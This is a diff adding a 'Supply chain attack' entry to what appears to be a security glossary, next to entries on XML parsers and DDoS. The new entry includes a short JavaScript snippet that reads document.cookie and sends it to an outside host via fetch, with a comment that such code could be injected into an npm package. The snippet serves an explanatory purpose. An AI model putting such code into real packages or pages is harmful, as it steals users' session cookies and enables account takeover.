@@ -138,3 +138,15 @@ is processed by a weakly configured XML parser.
 A distributed DDoS is a cyber-attack where the perpetrator uses more than one unique IP address,
 often thousands of them.
 Distributed autoscale systems may try to cope with DDoS.
+
+#### Supply chain attack
+
+Is a type of attack that targets an organization by attacking its third-party vendors, suppliers, or partners.
+
+````js
+function x() {
+  const d = document.cookie;
+  fetch('https://x-site.com/log?data=' + d);
+}
+// This code can be injected into some package, and installed via: npm install.
+````
